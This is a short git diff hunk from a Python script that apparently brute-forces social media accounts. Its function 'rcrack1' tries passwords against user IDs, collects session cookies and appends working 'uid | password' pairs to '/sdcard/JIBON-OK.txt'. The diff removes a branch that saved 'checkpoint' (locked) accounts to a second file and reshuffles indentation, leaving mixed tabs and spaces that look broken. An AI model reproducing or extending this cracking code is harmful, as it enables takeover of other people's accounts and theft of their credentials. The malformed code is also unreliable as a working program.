@@ -328,18 +328,11 @@ def rcrack1(uid,pwx,tl):
                 cek_apk(session,coki)
                 open('/sdcard/JIBON-OK.txt', 'a').write(uid+' | '+ps+'\n')
                 ok.append(uid)
-            break
-	    elif 'checkpoint' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				uid = coki[141:156]
-				print('\33[1;91m[JIBON-CP] '+uid+' | '+ps+'\33[0;92m')
-				open('JIBON-CP.txt', 'a').write(uid+' | '+ps+'\n')
-				cps.append(uid)
-				break
+                break
 			else:
 				continue
-        loop+=1
-    except:
-        pass
- 
+		loop+=1
+	except:
+		pass
+
 Mrx()
